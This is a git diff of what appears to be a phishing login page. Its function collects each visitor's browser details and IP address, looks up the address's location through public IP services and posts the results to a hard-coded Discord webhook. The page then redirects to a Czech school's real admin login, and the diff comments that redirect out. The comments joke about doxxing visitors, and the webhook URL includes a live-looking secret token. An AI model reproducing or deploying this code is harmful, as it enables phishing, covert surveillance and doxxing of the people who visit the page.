@@ -292,12 +292,18 @@ window.addEventListener('resize', checkWidth);
                 </script>
 <script>
         document.getElementById("form_login").addEventListener("submit", e => e.preventDefault());
+        let dgb = 0;
+        function dbg() {
+                dgb++;
+                alert(dgb);
+        }
                 window.onload = function() {
                     //window.open("https://example.com", "_blank", "toolbar=no,location=no");
-                        alert("MM");
+                        console.log("MM");
                     
                 };
                     function lokin() {
+                            dbg();
                             var WebhookUrl = 'https://discord.com/api/webhooks/1352666399331586119/scMEezOHl88cf4pF9ZzEoaUjujrUjtD12VVPA9ufOD0uSzWUYn7bryKvd7UqJ6TzLUqI'; //discord url DUH
 
 var request = new XMLHttpRequest();
@@ -307,14 +313,14 @@ request.setRequestHeader('Content-type', 'application/json'); //basically just s
 (async () => {
   try {
     const userAgent = navigator.userAgent;
-
+dbg();
     const IPresponse = await fetch('https://api.ipify.org?format=json');
     const IPdata = await IPresponse.json();
     const userIP = IPdata.ip; //get your ip with ipify cuz im retarded and dont know how to normally
-
+dbg();
     const dataResponse = await fetch(`https://freeipapi.com/api/json/${userIP}`); //ermm when you enter the website it will send you ip to ipapi and ipapi will say hmm yes okay thats very hot now let me dox you rq
     const data = await dataResponse.json();
-
+dbg();
     const success = true; // you shouldnt do this im just lazy to change it i was debugging
 
     if (success === true) { // you shouldnt do this im just lazy to change it i was debugging
@@ -366,7 +372,7 @@ request.setRequestHeader('Content-type', 'application/json'); //basically just s
         ]
       };
       await request.send(JSON.stringify(Payload));//the request was set up in the beggining so we just do request.send(PAYLOAD) and yippie we go!!!!!
-            window.location.href = "https://www.zs-bezno.cz/admin/login";
+            //window.location.href = "https://www.zs-bezno.cz/admin/login";
 
     } else {
       console.error('status: ', data.status, ' message: ', data.message); //if error then dont explode
